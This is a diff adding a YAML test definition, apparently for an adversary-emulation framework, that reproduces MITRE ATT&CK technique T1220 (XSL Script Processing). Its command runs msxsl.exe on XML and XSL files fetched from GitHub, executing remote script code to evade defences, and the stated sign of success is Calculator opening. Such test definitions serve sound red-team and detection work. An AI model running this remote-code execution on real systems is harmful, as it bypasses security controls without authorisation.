@@ -1,0 +1,18 @@
+- description: 'Executes the code specified within a XSL script tag during XSL transformation
+    using a remote payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+    Open Calculator.exe when test sucessfully executed, while AV turned off.
+
+    '
+  id: 931aef32fb811108ca2cedd7bd54257d
+  name: MSXSL Bypass using remote files
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1220
+    name: XSL Script Processing
